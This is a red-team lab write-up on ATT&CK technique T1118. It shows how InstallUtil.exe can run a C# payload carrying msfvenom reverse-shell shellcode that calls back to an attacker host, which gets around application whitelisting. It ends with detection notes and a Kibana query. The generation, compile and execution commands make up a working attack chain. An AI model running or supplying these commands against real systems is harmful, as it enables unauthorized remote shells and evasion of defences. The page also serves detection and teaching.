---
description: InstallUtil code execution - bypass application whitelisting.
---

# T1118: InstallUtil

## Code

First of, generate a C\# payload \(with [InstalUtil script](https://github.com/khr0x40sh/WhiteListEvasion)\) that contains shellcode from msfvenom and upload the temp.cs file to victim's machine:

{% code-tabs %}
{% code-tabs-item title="attacker@local" %}
```python
python InstallUtil.py --cs_file temp.cs --exe_file temp.exe --payload windowsreverse_shell_tcp --lhost 10.0.0.5 --lport 443
```
{% endcode-tabs-item %}
{% endcode-tabs %}

## Execution

Compile the .cs to an .exe:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```bash
PS C:\Windows\Microsoft.NET\Framework\v4.0.30319> .\csc.exe C:\experiments\installUtil\temp.cs
```
{% endcode-tabs-item %}
{% endcode-tabs %}

Execute the payload:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```bash
PS C:\Windows\Microsoft.NET\Framework\v4.0.30319> .\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Microsoft.NET\Framework\v4.0.30319\temp.exe
Microsoft (R) .NET Framework Installation utility Version 4.0.30319.17929
Copyright (C) Microsoft Corporation.  All rights reserved.

Hello From Uninstall...I carry out the real work...
```
{% endcode-tabs-item %}
{% endcode-tabs %}

Enjoy the sweet reverse shell:

![](../.gitbook/assets/installutil-shell.png)

## Observations

As per usual, look for InstallUtil processes that have established connections, especially those with cmd or powershell processes running as children - you should treat them as suspicious and investigate the endpoint closer:

![](../.gitbook/assets/installutil-procexp.png)

A very primitive query in kibana allowing to find events where InstallUtil spawns cmd:

{% code-tabs %}
{% code-tabs-item title="kibana" %}
```text
event_data.ParentCommandLine:"*installutil.exe*" && event_data.Image:cmd.exe
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![InstallUtil launching the malicious payload](../.gitbook/assets/installutil-kibana.png)

![csc.exe created a temp.exe which contains the reverse shell payload](../.gitbook/assets/installutils-csc.png)

What is interesting is that I could not see an established network connection logged in sysmon logs, although I could see other network connections from the victim machine being logged.

{% hint style="danger" %}
Will be coming back to this one for further inspection.
{% endhint %}

{% embed data="{\"url\":\"https://attack.mitre.org/wiki/Technique/T1118\",\"type\":\"link\",\"title\":\"InstallUtil - ATT&CK for Enterprise\"}" %}

{% embed data="{\"url\":\"https://github.com/khr0x40sh/WhiteListEvasion\",\"type\":\"link\",\"title\":\"khr0x40sh/WhiteListEvasion\",\"description\":\"WhiteListEvasion - Collection of scripts, binaries and the like to aid in WhiteList Evasion on a Microsoft Windows Network.\",\"icon\":{\"type\":\"icon\",\"url\":\"https://github.com/fluidicon.png\",\"aspectRatio\":0},\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"https://avatars1.githubusercontent.com/u/6656699?s=400&v=4\",\"width\":400,\"height\":400,\"aspectRatio\":1}}" %}

